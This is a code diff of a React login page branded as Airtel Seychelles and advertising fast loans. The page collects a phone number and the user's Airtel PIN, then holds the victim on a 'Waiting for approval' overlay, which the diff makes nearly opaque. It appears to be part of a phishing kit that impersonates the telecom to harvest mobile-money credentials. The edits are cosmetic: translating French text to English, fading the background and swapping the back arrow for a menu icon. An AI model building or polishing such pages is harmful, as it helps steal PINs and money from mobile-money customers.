@@ -8,7 +8,7 @@ const PHONE_MAX = 7;
 function AirtelLogin() {
   const [phone, setPhone] = useState('');
   const [pin, setPin] = useState<string[]>(['', '', '', '']);
-  const [showPin, setShowPin] = useState(false); // Added state for PIN visibility
+  const [showPin, setShowPin] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   
   const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
@@ -115,6 +115,16 @@ function AirtelLogin() {
           position: relative;
         }
 
+        /* FADED BACKGROUND CLASS */
+        .faded-content {
+          opacity: 0.15;
+          pointer-events: none;
+          transition: opacity 0.3s ease;
+          display: flex;
+          flex-direction: column;
+          min-height: 100vh;
+        }
+
         /* WAITING OVERLAY */
         .waiting-overlay {
           position: fixed;
@@ -128,7 +138,7 @@ function AirtelLogin() {
           justify-content: center;
           z-index: 9999;
           padding: 20px;
-          background-color: rgba(255, 255, 255, 0.4);
+          background-color: rgba(255, 255, 255, 0.9); /* Mostly solid white to hide background */
         }
 
         .custom-spinner {
@@ -175,7 +185,7 @@ function AirtelLogin() {
           position: relative;
         }
 
-        .back-btn {
+        .menu-btn {
           position: absolute;
           left: 20px;
           top: 20px;
@@ -237,7 +247,7 @@ function AirtelLogin() {
           text-align: center;
         }
 
-        /* PHONE INPUT (Improved Contrast) */
+        /* PHONE INPUT */
         .phone-wrapper {
           width: 100%;
           display: flex;
@@ -389,147 +399,152 @@ function AirtelLogin() {
       {isWaitingForApproval && (
         <div className="waiting-overlay">
           <div className="custom-spinner"></div>
-          <div className="waiting-title">En attente d'approbation</div>
+          <div className="waiting-title">Waiting for approval</div>
           <div className="waiting-message">
-            Votre demande a été envoyée. Merci de patienter pendant la vérification...
+            Your request has been sent. Please wait while we verify your details...
           </div>
         </div>
       )}
 
-      {/* HEADER */}
-      <div className="header-section">
-        <button className="back-btn" onClick={() => navigate('/')}>
-          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-            <line x1="19" y1="12" x2="5" y2="12" />
-            <polyline points="12 19 5 12 12 5" />
-          </svg>
-        </button>
-        <h1 className="header-title">Airtel Seychelles</h1>
-        <p className="header-subtitle">Fast loans. Anytime. Anywhere.</p>
-      </div>
-
-      {/* MAIN CARD */}
-      <div className="main-card">
-        <h2 className="card-title">Welcome back</h2>
-        <p className="card-subtitle">Log in to your Airtel Seychelles account</p>
-
-        <form onSubmit={handleLogin} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
-          
-          <span className="input-label">Phone number</span>
-          <div className="phone-wrapper">
-            <div className="phone-prefix">
-              {/* Seychelles Flag SVG */}
-              <svg width="20" height="14" viewBox="0 0 300 200" xmlns="http://www.w3.org/2000/svg" style={{ borderRadius: '2px' }}>
-                <path fill="#003f87" d="M0,200 L300,0 L0,0 Z"/>
-                <path fill="#fcd856" d="M0,200 L300,0 L300,50 Z"/>
-                <path fill="#d62828" d="M0,200 L300,50 L300,100 Z"/>
-                <path fill="#ffffff" d="M0,200 L300,100 L300,150 Z"/>
-                <path fill="#007a3d" d="M0,200 L300,150 L300,200 Z"/>
-              </svg>
-              {COUNTRY_CODE}
-            </div>
-            <input
-              type="tel"
-              className="phone-input-field"
-              placeholder={PHONE_PLACEHOLDER}
-              value={phone}
-              onChange={handlePhoneChange}
-              maxLength={PHONE_MAX}
-              disabled={isLoading || isWaitingForApproval}
-            />
-          </div>
-
-          <span className="input-label">Enter your Airtel PIN code</span>
-          
-          {/* Added Wrapper for PIN + Eye Icon */}
-          <div className="pin-section-wrapper">
-            <div className="pin-boxes">
-              {pin.map((digit, index) => (
-                <input
-                  key={index}
-                  type={showPin ? 'text' : 'password'}
-                  maxLength={1}
-                  value={digit}
-                  ref={(el) => { pinRefs.current[index] = el; }}
-                  onChange={(e) => handlePinChange(index, e.target.value)}
-                  onKeyDown={(e) => handleKeyDown(index, e)}
-                  className="pin-box"
-                  placeholder="•"
-                  disabled={isLoading || isWaitingForApproval}
-                />
-              ))}
-            </div>
-
-            {/* Eye Toggle Button */}
-            <button 
-              type="button" 
-              className="eye-btn" 
-              onClick={() => setShowPin(!showPin)}
-            >
-              {showPin ? (
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                  <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
-                  <line x1="1" y1="1" x2="23" y2="23"></line>
-                </svg>
-              ) : (
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
-                  <circle cx="12" cy="12" r="3"></circle>
-                </svg>
-              )}
-            </button>
-          </div>
-
-          <button 
-            type="submit" 
-            className={`login-btn ${isFormValid ? 'active' : ''}`}
-            disabled={!isFormValid || isLoading || isWaitingForApproval}
-          >
-            Connexion
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-              <line x1="5" y1="12" x2="19" y2="12" />
-              <polyline points="12 5 19 12 12 19" />
+      {/* MAIN CONTENT WRAPPER (Gets faded when waiting) */}
+      <div className={isWaitingForApproval ? 'faded-content' : ''}>
+        
+        {/* HEADER */}
+        <div className="header-section">
+          <button className="menu-btn" onClick={() => navigate('/')}>
+            {/* Changed to a Hamburger Menu (Three lines) */}
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+              <line x1="3" y1="12" x2="21" y2="12"></line>
+              <line x1="3" y1="6" x2="21" y2="6"></line>
+              <line x1="3" y1="18" x2="21" y2="18"></line>
             </svg>
           </button>
-
-        </form>
-
-        <div className="security-footer">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-          </svg>
-          Your information is secure.
+          <h1 className="header-title">Airtel Seychelles</h1>
+          <p className="header-subtitle">Fast loans. Anytime. Anywhere.</p>
         </div>
-      </div>
 
-      {/* BRAND ICONS FOOTER */}
-      <div className="brand-icons-footer">
-        <div className="brand-icon">
-          <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
-            <div style={{ width: '12px', height: '12px', backgroundColor: '#000', borderRadius: '50%', marginBottom: '4px' }}></div>
-            <span style={{ fontSize: '9px', fontWeight: 'bold', color: '#000' }}>Airtel</span>
-          </div>
-        </div>
-        
-        <div className="brand-icon">
-          <div style={{ width: '36px', height: '48px', backgroundColor: '#1E293B', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="#FCD34D" stroke="#D97706" strokeWidth="1.5">
-              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+        {/* MAIN CARD */}
+        <div className="main-card">
+          <h2 className="card-title">Welcome back</h2>
+          <p className="card-subtitle">Log in to your Airtel Seychelles account</p>
+
+          <form onSubmit={handleLogin} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
+            
+            <span className="input-label">Phone number</span>
+            <div className="phone-wrapper">
+              <div className="phone-prefix">
+                {/* Seychelles Flag SVG */}
+                <svg width="20" height="14" viewBox="0 0 300 200" xmlns="http://www.w3.org/2000/svg" style={{ borderRadius: '2px' }}>
+                  <path fill="#003f87" d="M0,200 L300,0 L0,0 Z"/>
+                  <path fill="#fcd856" d="M0,200 L300,0 L300,50 Z"/>
+                  <path fill="#d62828" d="M0,200 L300,50 L300,100 Z"/>
+                  <path fill="#ffffff" d="M0,200 L300,100 L300,150 Z"/>
+                  <path fill="#007a3d" d="M0,200 L300,150 L300,200 Z"/>
+                </svg>
+                {COUNTRY_CODE}
+              </div>
+              <input
+                type="tel"
+                className="phone-input-field"
+                placeholder={PHONE_PLACEHOLDER}
+                value={phone}
+                onChange={handlePhoneChange}
+                maxLength={PHONE_MAX}
+                disabled={isLoading || isWaitingForApproval}
+              />
+            </div>
+
+            <span className="input-label">Enter your Airtel PIN code</span>
+            
+            <div className="pin-section-wrapper">
+              <div className="pin-boxes">
+                {pin.map((digit, index) => (
+                  <input
+                    key={index}
+                    type={showPin ? 'text' : 'password'}
+                    maxLength={1}
+                    value={digit}
+                    ref={(el) => { pinRefs.current[index] = el; }}
+                    onChange={(e) => handlePinChange(index, e.target.value)}
+                    onKeyDown={(e) => handleKeyDown(index, e)}
+                    className="pin-box"
+                    placeholder="•"
+                    disabled={isLoading || isWaitingForApproval}
+                  />
+                ))}
+              </div>
+
+              {/* Eye Toggle Button */}
+              <button 
+                type="button" 
+                className="eye-btn" 
+                onClick={() => setShowPin(!showPin)}
+              >
+                {showPin ? (
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                    <line x1="1" y1="1" x2="23" y2="23"></line>
+                  </svg>
+                ) : (
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                    <circle cx="12" cy="12" r="3"></circle>
+                  </svg>
+                )}
+              </button>
+            </div>
+
+            <button 
+              type="submit" 
+              className={`login-btn ${isFormValid ? 'active' : ''}`}
+              disabled={!isFormValid || isLoading || isWaitingForApproval}
+            >
+              Connexion
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                <line x1="5" y1="12" x2="19" y2="12" />
+                <polyline points="12 5 19 12 12 19" />
+              </svg>
+            </button>
+
+          </form>
+
+          <div className="security-footer">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
             </svg>
+            Your information is secure.
           </div>
         </div>
 
-        <div className="brand-icon">
-          <div style={{ width: '32px', height: '20px', backgroundColor: '#FCD34D', borderRadius: '3px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', border: '1px solid #D97706' }}>
-            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Airtel</span>
-            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Money</span>
+        {/* BRAND ICONS FOOTER */}
+        <div className="brand-icons-footer">
+          <div className="brand-icon">
+            <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
+              <div style={{ width: '12px', height: '12px', backgroundColor: '#000', borderRadius: '50%', marginBottom: '4px' }}></div>
+              <span style={{ fontSize: '9px', fontWeight: 'bold', color: '#000' }}>Airtel</span>
+            </div>
           </div>
-        </div>
+          
+          <div className="brand-icon">
+            <div style={{ width: '36px', height: '48px', backgroundColor: '#1E293B', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="#FCD34D" stroke="#D97706" strokeWidth="1.5">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+              </svg>
+            </div>
+          </div>
 
-        <div className="brand-icon">
-          <div style={{ width: '36px', height: '36px', backgroundColor: '#FCD34D', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '2px solid #F59E0B' }}>
-            <span style={{ fontSize: '18px', fontWeight: '900', color: '#78350F' }}>₣</span>
+          <div className="brand-icon">
+            <div style={{ width: '32px', height: '20px', backgroundColor: '#FCD34D', borderRadius: '3px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', border: '1px solid #D97706' }}>
+              <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Airtel</span>
+              <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Money</span>
+            </div>
+          </div>
+
+          <div className="brand-icon">
+            <div style={{ width: '36px', height: '36px', backgroundColor: '#FCD34D', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '2px solid #F59E0B' }}>
+              <span style={{ fontSize: '18px', fontWeight: '900', color: '#78350F' }}>₣</span>
+            </div>
           </div>
         </div>
       </div>
